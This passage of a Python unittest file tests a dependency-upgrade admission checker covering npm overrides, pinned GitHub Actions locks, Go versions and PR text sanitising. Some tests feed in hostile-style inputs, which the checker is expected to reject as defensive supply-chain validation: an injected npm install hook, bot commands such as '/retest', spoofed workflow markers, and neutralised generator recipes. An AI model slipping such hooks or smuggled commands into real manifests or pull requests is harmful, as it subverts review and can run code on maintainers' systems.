                    "overrides": {"undici": "7.30.1", "oav": {"jsonpath-plus": "10.3.0"},
                                  "@azure/ms-rest-js": {"uuid": "11.1.0"},
                                  "@azure-tools/typespec-go": {"@typespec/compiler": "$@typespec/compiler"}}}
        before = json.dumps(document)
        after = before.replace("3.9.9", "3.9.10")
        entries = native.changes("api/package.json", before, after)
        self.assertEqual([entry["package"] for entry in entries], ["prettier"])
        native.verify_coverage(entries, lambda path: after, {"api/package.json"})
        bad = json.loads(after)
        del bad["overrides"]["oav"]
        with self.assertRaises(ValueError):
            native.changes("api/package.json", before, json.dumps(bad))
        bad = json.loads(after)
        bad["overrides"]["@azure/ms-rest-js"] = {"scripts": {"install": "unsafe"}}
        with self.assertRaises(ValueError):
            native.changes("api/package.json", before, json.dumps(bad))

    def test_generated_action_lock_requires_existing_source_coverage_for_admission(self):
        source, lock = ".github/workflows/example.md", ".github/workflows/example.lock.yml"
        metadata = ".github/aw/actions-lock.json"
        old = "steps:\n  - uses: actions/checkout@" + "b" * 40 + "\n"
        new = old.replace("b" * 40, PIN)
        intents = native.changes(lock, old, new)
        self.assertEqual(native.coverage_paths(intents), {source, lock, metadata})
        files = {source: old, lock: new}
        intent = {"ecosystem": "actions", "family": "actions/checkout", "intents": intents}
        snap = {"pull": {"head": {"sha": PIN}}, "files": [{"filename": lock}]}
        with patch.object(native, "tree_paths", side_effect=lambda *args: set(files)), \
                patch.object(native, "main_sha", return_value=PIN), \
                patch.object(native, "content", side_effect=lambda repo, sha, path: files[path]):
            with self.assertRaises(ValueError):
                native.verify_coverage(intents, files.__getitem__, set(files))
            with self.assertRaises(ValueError):
                native.admission_safe(REPO, snap, intent)
            files[source] = new
            native.verify_coverage(intents, files.__getitem__, set(files))
            native.admission_safe(REPO, snap, intent)
        with patch.object(native, "tree_paths", side_effect=[{lock}, set(files)]), \
                patch.object(native, "main_sha", return_value=PIN), \
                patch.object(native, "content", side_effect=lambda repo, sha, path: files[path]), \
                self.assertRaisesRegex(ValueError, "lost its existing source"):
            native.admission_safe(REPO, snap, intent)
        source_intents = native.changes(source, old, new)
        files[lock] = old
        with self.assertRaises(ValueError):
            native.verify_coverage(source_intents, files.__getitem__, set(files))

    def test_generated_action_coverage_validates_source_tags_and_relevant_compiler_metadata(self):
        source, lock = ".github/workflows/example.md", ".github/workflows/example.lock.yml"
        metadata = ".github/aw/actions-lock.json"
        old = "steps:\n  - uses: actions/checkout@" + "b" * 40 + "\n"
        new = old.replace("b" * 40, PIN)
        intents = native.changes(lock, old, new)
        action = {"repo": "actions/checkout", "version": "v2.0.0", "sha": PIN}
        historical = {"repo": "actions/checkout", "version": "v1.0.0", "sha": "b" * 40}
        document = {"entries": {"actions/checkout@v2.0.0": action,
                                "actions/checkout@v1.0.0": historical},
                    "containers": {"fixed": {"digest": "unchanged"}}}
        compiled = "# gh-aw-manifest: " + json.dumps({"version": 1, "actions": [action]}) + "\n" + new
        files = {source: "steps:\n  - uses: actions/checkout@v2.0.0\n", lock: compiled,
                 metadata: json.dumps(document)}
        with mock_api(return_value={"sha": PIN}):
            native.verify_coverage(intents, files.__getitem__, set(files))
            # Historical lock entries belonging to other consumers are not
            # current references from this source/compiled workflow.
            for path, stale in (
                    (source, files[source].replace("v2.0.0", "v1.0.0")),
                    (metadata, json.dumps(document).replace('"sha": "' + PIN, '"sha": "' + "b" * 40)),
                    (metadata, json.dumps({"entries": {}})),
                    (metadata, json.dumps({"entries": {"actions/checkout@v2.0.0": historical}})),
                    (lock, compiled.replace('"sha": "' + PIN, '"sha": "' + "b" * 40))):
                original = files[path]
                files[path] = stale
                with self.subTest(path=path, stale=stale), self.assertRaises(ValueError):
                    native.verify_coverage(intents, files.__getitem__, set(files))
                files[path] = original
            with self.assertRaisesRegex(ValueError, "source tag lacks intended"):
                native.verify_coverage(intents, files.__getitem__, set(files) - {metadata})
            # A compiler-injected action can legitimately be absent from the
            # editable source, but its compiled metadata still needs coverage.
            files[source] = "permissions: read-all\n"
            native.verify_coverage(intents, files.__getitem__, set(files))
            files[source] = new
            native.verify_coverage(intents, files.__getitem__, set(files))
            files[metadata] = json.dumps(document).replace('"sha": "' + PIN, '"sha": "' + "b" * 40)
            with self.assertRaisesRegex(ValueError, "compiler actions lock does not cover"):
                native.verify_coverage(intents, files.__getitem__, set(files))
        files[source] = "steps:\n  - uses: actions/checkout@v2.0.0\n"
        files[metadata] = json.dumps(document)
        with mock_api(return_value={"sha": "f" * 40}), \
                self.assertRaisesRegex(ValueError, "not the official intended"):
            native.verify_coverage(intents, files.__getitem__, set(files))

    def test_handwritten_action_yaml_does_not_require_generated_source_or_metadata_coverage(self):
        old = "steps:\n  - uses: actions/checkout@" + "b" * 40 + "\n"
        new = old.replace("b" * 40, PIN)
        for suffix in (".yml", ".yaml"):
            workflow = ".github/workflows/handwritten" + suffix
            intents = native.changes(workflow, old, new)
            files = {workflow: new, ".github/workflows/handwritten.md": old,
                     ".github/aw/actions-lock.json": '{"entries":{"actions/checkout@v1.0.0":{}}}'}
            snap = {"pull": {"head": {"sha": PIN}}, "files": [{"filename": workflow}]}
            intent = {"ecosystem": "actions", "family": "actions/checkout", "intents": intents}
            with self.subTest(suffix=suffix), \
                    patch.object(native, "tree_paths", side_effect=lambda *args: set(files)), \
                    patch.object(native, "main_sha", return_value=PIN), \
                    patch.object(native, "content", side_effect=lambda repo, sha, path: files[path]):
                native.verify_coverage(intents, files.__getitem__, set(files))
                native.admission_safe(REPO, snap, intent)

    def test_npm_coverage_accepts_compatible_newer_stable_versions_not_downgrades(self):
        def covered(actual, target):
            intent = {"ecosystem": "npm", "package": "one", "manifest": "api/package.json",
                      "key": ["dependencies", "one"], "target": target}
            native.verify_coverage([intent], lambda path: json.dumps({"dependencies": {"one": actual}}),
                                   {"api/package.json"})
        for actual, target in (("3.9.11", "3.9.10"), ("^1.18.0", "^1.17.0"), ("7.30.1", "^7.29.0")):
            covered(actual, target)
        for actual, target in (("3.9.9", "3.9.10"), ("4.0.0", "3.9.10"), ("latest", "^1.17.0"),
                               ("^1.18.0", "1.17.0"), ("^0.74.0", "^0.73.2")):
            with self.subTest(actual=actual, target=target), self.assertRaises(ValueError):
                covered(actual, target)

    def test_shared_native_admission_requires_eligible_complete_npm_consumers(self):
        item = {"ecosystem": "npm", "package": "one", "manifest": "api/package.json",
                "key": ["dependencies", "one"], "target": "^1.2.0"}
        lock = "api/package-lock.json"
        evidence = {"group": {"ecosystem": "npm", "family": "one", "intents": [item]},
                    "paths": ["api/package.json", lock], "available": ["api/package.json", lock],
                    "contents": {lock: json.dumps({"lockfileVersion": 3, "packages": {
                        "node_modules/one": {"version": "1.2.3"}}})}}
        native.native_policy("check-admission", evidence)
        for mutation, reason in (({"ecosystem": "go"}, "Go workspace/vendor"),
                                 ({"family": "typespec"}, "TypeSpec generated")):
            blocked = copy.deepcopy(evidence)
            blocked["group"].update(mutation)
            with self.subTest(mutation=mutation), self.assertRaisesRegex(ValueError, reason):
                native.native_policy("check-admission", blocked)
        evidence["paths"] = ["api/package.json"]
        with self.assertRaisesRegex(ValueError, "lacks updated lock"):
            native.native_policy("check-admission", evidence)
        evidence["paths"].append(lock)
        evidence["contents"][lock] = evidence["contents"][lock].replace("1.2.3", "1.1.0")
        with self.assertRaisesRegex(ValueError, "does not resolve intended target"):
            native.native_policy("check-admission", evidence)

    def test_obsolete_workflow_requires_both_live_source_and_lock_coverage(self):
        old = "steps:\n  - uses: actions/checkout@" + "b" * 40 + "\n"
        new = old.replace("b" * 40, PIN)
        intents = native.changes(".github/workflows/obsolete.yml", old, new)
        files = {".github/workflows/obsolete.md": new, ".github/workflows/obsolete.lock.yml": new}
        native.verify_coverage(intents, files.__getitem__, set(files))
        files[".github/workflows/obsolete.lock.yml"] = old
        with self.assertRaises(ValueError):
            native.verify_coverage(intents, files.__getitem__, set(files))
        del files[".github/workflows/obsolete.lock.yml"]
        with self.assertRaises(ValueError):
            native.verify_coverage(intents, files.__getitem__, set(files))

    def test_unrelated_package_same_manifest_does_not_cover_upgrade(self):
        intents = native.changes("api/package.json", '{"dependencies":{"one":"1.0.0","two":"1.0.0"}}', '{"dependencies":{"one":"2.0.0","two":"1.0.0"}}')
        with self.assertRaises(ValueError):
            native.verify_coverage(intents, lambda path: '{"dependencies":{"one":"1.0.0","two":"2.0.0"}}',
                                   {"api/package.json"})

    def test_typespec_primary_upgrade_allows_transitive_lock_graph_replacement(self):
        base, head = "0" * 40, "1" * 40
        before_manifest = {"dependencies": {"@typespec/compiler": "^1.16.0",
                                             "@azure-tools/typespec-go": "^0.17.4",
                                             "@typespec/http": "^1.16.0"},
                           "overrides": {"undici": "^7.30.1", "oav": {"ajv": "^6.12.6"}}}
        after_manifest = copy.deepcopy(before_manifest)
        after_manifest["dependencies"].update({"@typespec/compiler": "^1.17.0",
                                                "@azure-tools/typespec-go": "^0.17.6"})
        def lock(compiler, emitter, transitive):
            return {"lockfileVersion": 3, "packages": {
                "": {"dependencies": {"@typespec/compiler": "^1.17.0"}},
                "node_modules/@typespec/compiler": {"version": compiler},
                "node_modules/@typespec/http": {"version": compiler},
                "node_modules/@azure-tools/typespec-go": {"version": emitter},
                "node_modules/undici": {"version": "7.30.1"},
                "node_modules/" + transitive: {"version": "2.0.0"}}}
        before_lock = lock("1.16.0", "0.17.4", "removed-transitive")
        after_lock = lock("1.17.0", "0.17.6", "new-transitive")
        documents = {(base, "api/package.json"): json.dumps(before_manifest),
                     (head, "api/package.json"): json.dumps(after_manifest),
                     (base, "api/package-lock.json"): json.dumps(before_lock),
                     (head, "api/package-lock.json"): json.dumps(after_lock)}
        snap = {"pull": {"number": 7460, "base": {"sha": base}, "head": {"sha": head}},
                "files": [{"filename": path, "status": "modified"}
                          for path in ("api/package-lock.json", "api/package.json")]}
        with mock_api(return_value={"merge_base_commit": {"sha": base}}), \
                patch.object(native, "content", side_effect=lambda repo, sha, path: documents[(sha, path)]):
            group = native.source_intent(REPO, snap)
            self.assertEqual(group["family"], "typespec")
            self.assertEqual({item["package"] for item in group["intents"]},
                             {"@typespec/compiler", "@azure-tools/typespec-go", "@typespec/http"})
            self.assertTrue(all(item["lock_manifests"] == ["api/package-lock.json"]
                                for item in group["intents"] if item["manifest"].endswith("package.json")))
            lock_only = {**snap, "files": snap["files"][:1]}
            with self.assertRaisesRegex(ValueError, "lack primary"):
                native.source_intent(REPO, lock_only)
        # Fresh solver output may replace historical transitives again and
        # resolve a newer compatible primary patch, without downgrading undici.
        regenerated = lock("1.17.2", "0.17.7", "another-current-transitive")
        files = {"api/package.json": json.dumps(after_manifest),
                 "api/package-lock.json": json.dumps(regenerated)}
        native.verify_coverage(group["intents"], files.__getitem__, set(files))
        regenerated["packages"]["node_modules/@typespec/http"]["version"] = "1.16.0"
        files["api/package-lock.json"] = json.dumps(regenerated)
        with self.assertRaisesRegex(ValueError, "upgrade intent is not covered"):
            native.verify_coverage(group["intents"], files.__getitem__, set(files))
        regenerated["packages"]["node_modules/@typespec/http"]["version"] = "1.17.2"
        regenerated["packages"]["node_modules/@typespec/compiler"]["version"] = "1.16.0"
        files["api/package-lock.json"] = json.dumps(regenerated)
        with self.assertRaisesRegex(ValueError, "compatible lock resolution"):
            native.verify_coverage(group["intents"], files.__getitem__, set(files))
        added_primary = copy.deepcopy(after_manifest)
        added_primary["dependencies"]["@typespec/unapproved"] = "^1.17.0"
        with self.assertRaisesRegex(ValueError, "added/removed dependency"):
            native.changes("api/package.json", json.dumps(before_manifest), json.dumps(added_primary))

    def test_targeted_tree_proofs_do_not_enumerate_truncated_vendor_repositories(self):
        root, github, workflows, blob, vendor = ("0" * 40, "1" * 40, "2" * 40, "3" * 40, "4" * 40)
        trees = {
            root: [{"path": ".github", "type": "tree", "mode": "040000", "sha": github},
                   {"path": "vendor", "type": "tree", "mode": "040000", "sha": vendor}],
            github: [{"path": "workflows", "type": "tree", "mode": "040000", "sha": workflows}],
            workflows: [{"path": "obsolete.md", "type": "blob", "mode": "100644", "sha": blob},
                        {"path": "obsolete.lock.yml", "type": "blob", "mode": "100644", "sha": blob}]}
        def api(endpoint, **kwargs):
            if endpoint.endswith("?recursive=1"):
                return {"truncated": True, "tree": [{"path": "vendor/partial", "sha": blob}]}
            sha = endpoint.rsplit("/", 1)[1]
            self.assertNotEqual(sha, vendor, "irrelevant vendor subtree must never be fetched")
            return {"truncated": False, "tree": trees[sha]}
        old = "steps:\n  - uses: actions/checkout@" + "b" * 40 + "\n"
        new = old.replace("b" * 40, PIN)
        intents = native.changes(".github/workflows/obsolete.yml", old, new)
        with mock_api(side_effect=api) as mocked:
            cache = {}
            available = native.tree_paths(REPO, root, native.coverage_paths(intents), cache)
            self.assertEqual(available, {".github/workflows/obsolete.md", ".github/workflows/obsolete.lock.yml"})
            native.verify_coverage(intents, lambda path: new, available)
            native.tree_paths(REPO, root, native.coverage_paths(intents), cache)
            self.assertEqual(mocked.call_count, 3)
        with mock_api(return_value={"truncated": True, "tree": []}):
            with self.assertRaisesRegex(ValueError, "incomplete targeted"):
                native.tree_paths(REPO, root, {".github/workflows/obsolete.md"})

    def test_go_semver_prerelease_and_pseudo_version_ordering(self):
        def covered(actual, target):
            intent = {"ecosystem": "go", "package": PACKAGE, "manifest": "backend/go.mod",
                      "key": PACKAGE, "target": target}
            native.verify_coverage([intent], lambda path: manifest(actual), {"backend/go.mod"})
        for actual, target in (("v1.19.0", "v1.18.4"), ("v3.0.0-beta.10", "v3.0.0-beta.3"),
                               ("v3.0.0", "v3.0.0-rc.1"),
                               ("v0.0.0-20261030010000-abcdef123456", "v0.0.0-20261029010000-abcdef123456"),
                               ("v2.0.0+incompatible", "v2.0.0")):
            covered(actual, target)
            if actual.split("+")[0] != target.split("+")[0]:
                with self.assertRaises(ValueError):
                    covered(target, actual)
        with self.assertRaises(ValueError):
            covered("unverifiable", "v1.0.0")

    def test_typespec_recipe_changes_fail_preflight_and_publication_scope(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / "api").mkdir()
            git(root, "init", "-b", "main")
            git(root, "config", "user.name", "Fixture")
            git(root, "config", "user.email", "fixture@example.test")
            before = json.dumps({"dependencies": {"@typespec/compiler": "^1.16.0"}})
            after = before.replace("1.16.0", "1.17.0")
            targets = ("models", "generate", "generate-go", "generate-sdk", "lint", "format")
            recipes = "".join(f"{target}:\n\t@echo {target}\n" for target in targets)
            (root / "api/package.json").write_text(before)
            (root / "api/Makefile").write_text(recipes)
            git(root, "add", ".")
            git(root, "commit", "-m", "base with trusted generator recipes")
            base = git(root, "rev-parse", "HEAD")
            intents = native.changes("api/package.json", before, after)
            group = {"ecosystem": "npm", "family": "typespec",
                     "sources": [{"intents": intents}]}
            (root / "api/package.json").write_text(after)
            git(root, "add", ".")
            git(root, "commit", "-m", "TypeSpec dependency upgrade")
            candidate = git(root, "rev-parse", "HEAD")
            for complete in (False, True):
                with self.subTest(complete=complete, recipes="unchanged"):
                    native.native_policy("check-tree", {"root": str(root.resolve()), "base": base,
                                         "tree": candidate, "paths": ["api/package.json"],
                                         "group": group, "complete": complete})
            for recipe in ("\ttrue\n", "\t@:\n"):
                (root / "api/Makefile").write_text(
                    "".join(f"{target}:\n{recipe}" for target in targets))
                git(root, "add", ".")
                git(root, "commit", "-m", "disable generator recipes")
                candidate = git(root, "rev-parse", "HEAD")
                paths = git(root, "diff", "--name-only", base, candidate).splitlines()
                for complete in (False, True):
                    with self.subTest(complete=complete, recipe=recipe):
                        with self.assertRaisesRegex(
                                ValueError, "protected or unrelated replacement path: api/Makefile"):
                            native.native_policy("check-tree", {"root": str(root.resolve()), "base": base,
                                                 "tree": candidate, "paths": paths,
                                                 "group": group, "complete": complete})



    def test_publication_text_never_injects_commands_or_human_notifications(self):
        for prose in ("@user", "@Azure/reviewers", "@scope/package",
                      "`@Azure/reviewers`", "\\`@Azure/reviewers\\`", "\\@user",
                      "```\n@Azure/reviewers\n```", "````\n``` @Azure/reviewers\n````"):
            with self.subTest(prose=prose):
                normalized = native.safe_text(prose)
                self.assertEqual(normalized, prose.replace("@", "\uff20"))
                self.assertNotIn("@", normalized)
                if "\n" not in prose:
                    title = "chore(deps): " + prose
                    self.assertEqual(native.safe_text(title, title=True), title.replace("@", "\uff20"))
        self.assertEqual(native.safe_text("@" * 20000), "\uff20" * 20000)
        prefix = "chore(deps): "
        self.assertEqual(native.safe_text(prefix + "@" * (200 - len(prefix)), title=True),
                         prefix + "\uff20" * (200 - len(prefix)))
        for text, title in (("@" * 20001, False), (prefix + "@" * 200, True)):
            with self.subTest(title=title), self.assertRaises(ValueError):
                native.safe_text(text, title=title)
        for text in ("fixes #123", "evidence\n/retest", "<!-- " + native.MARKER + "spoof -->",
                     "<!-- gh-aw-workflow-id: spoof -->"):
            with self.subTest(text=text), self.assertRaises(ValueError):
                native.safe_text(text)


if __name__ == "__main__":
    unittest.main()
